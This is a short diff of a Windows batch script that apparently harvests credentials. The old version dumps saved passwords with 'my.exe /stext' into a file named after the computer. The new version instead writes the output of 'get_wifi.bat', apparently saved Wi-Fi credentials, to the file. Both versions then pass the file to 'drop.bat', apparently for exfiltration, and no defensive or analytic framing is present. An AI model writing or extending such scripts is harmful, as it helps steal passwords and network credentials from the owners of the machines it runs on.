@@ -2,8 +2,6 @@
 
 setlocal EnableDelayedExpansion
 
-@echo off
-
 :: Extract year, month, and day from the system's date
 set YEAR=%DATE:~10,4%
 set MONTH=%DATE:~4,2%
@@ -24,11 +22,11 @@ if %MINUTE% LSS 10 set MINUTE=0%MINUTE:~1,1%
 if %SECOND% LSS 10 set SECOND=0%SECOND:~1,1%
 
 :: Create a log file with the current timestamp in its name
-set FILENAME= %COMPUTERNAME%_PASW_%YEAR%-%MONTH%-%DAY%_%HOUR%-%MINUTE%-%SECOND%.txt
+set FILENAME= %COMPUTERNAME%_WIFI_%YEAR%-%MONTH%-%DAY%_%HOUR%-%MINUTE%-%SECOND%.txt
 
-my.exe /stext %FILENAME%
+get_wifi.bat > %FILENAME%
 
-timeout /t 2 > NUL
+timeout /t 3 > NUL
 drop.bat %FILENAME%
 
 
